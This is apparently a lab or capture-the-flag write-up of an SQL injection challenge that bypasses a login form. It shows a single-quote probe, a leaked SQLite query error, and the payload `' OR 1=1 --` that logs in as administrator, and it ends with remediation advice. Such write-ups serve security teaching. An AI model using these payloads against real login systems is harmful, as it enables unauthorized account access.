---
sidebar_position: 1
---

# Login Admin

| Field | Detail |
|---|---|
| **OWASP Category** | A03 – Injection |
| **Severity** | Critical |
| **Technique** | SQL Injection via login form |

## Background

SQL Injection occurs when user input is concatenated directly into a SQL query without sanitization. The database cannot distinguish between the developer's intended query structure and attacker-supplied data. By injecting SQL syntax into an input field, an attacker can manipulate the query logic entirely.

A well-known basic test is submitting `OR ""=""` as the username or password. Since `""=""` is always true, this forces the query to return a result regardless of what credentials are stored — effectively bypassing authentication.

## Discovery

### Step 1 — Confirm the injection point

A single quote `'` was submitted as both the email and password value. Burp Suite intercepted the POST request. The server returned HTTP 500 with a raw database error:

```json
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"3590cb8af0bbb9e78c343b52b93773c9\"",
    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL"
  }
}
```

This confirms:
- Input is injected directly into the SQL query without sanitization
- The full query structure is exposed in the error response

### Step 2 — Analyze the query structure

```sql
SELECT * FROM Users WHERE email = '[INPUT]' AND password = '[HASHED_INPUT]' AND deletedAt IS NULL
```

The application uses SQLite. In SQLite, `--` is the comment operator — everything after it is ignored by the database engine.

## Exploit

**Email:** `' OR 1=1 --`  
**Password:** `anything`

This transforms the executed query into:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1 --' AND password = '...' AND deletedAt IS NULL
```

- The `'` closes the string literal, breaking out of the data context
- `OR 1=1` appends a condition that is always true
- `--` comments out the rest of the query, including the password and `deletedAt` checks

The database returns the first row — the administrator account.

## Impact

- Full authentication bypass without valid credentials
- Access to the administrator account and all privileged functionality
- Verbose error responses accelerated discovery by leaking the full query structure

## Video

[Watch on Loom](https://www.loom.com/share/06c580617fc44d68b21e6dc2255dd3c0)

## Recommendation

- Use parameterized queries (prepared statements) for all database interactions
- Never expose raw SQL error messages in HTTP responses — log errors server-side only
- Implement server-side input validation as a secondary defense layer
